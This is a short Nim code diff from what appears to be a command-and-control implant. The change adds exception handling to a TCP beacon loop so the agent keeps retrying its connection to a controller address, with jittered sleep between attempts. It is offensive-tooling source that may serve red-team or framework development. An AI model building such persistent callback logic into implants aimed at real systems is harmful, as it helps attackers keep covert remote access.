@@ -66,7 +66,10 @@ proc tcpCommunicate*(contact: Contact, sleep: int, beacon: Beacon) =
     while true:
         let client = newSocket()
         logger.log(lvlInfo, fmt"Connecting to {contact.address} on port {contact.port}")
-        client.connect(contact.address, Port(contact.port))
-        listen(client, beacon)
+        try:
+            client.connect(contact.address, Port(contact.port))
+            listen(client, beacon)
+        except OSError:
+            logger.log(lvlInfo, fmt"[-] {contact.address} on port {contact.port} is either unavailable or a firewall is blocking traffic.")
         # Sleep until the next beacon.
         jitterSleep(sleep, "TCP")
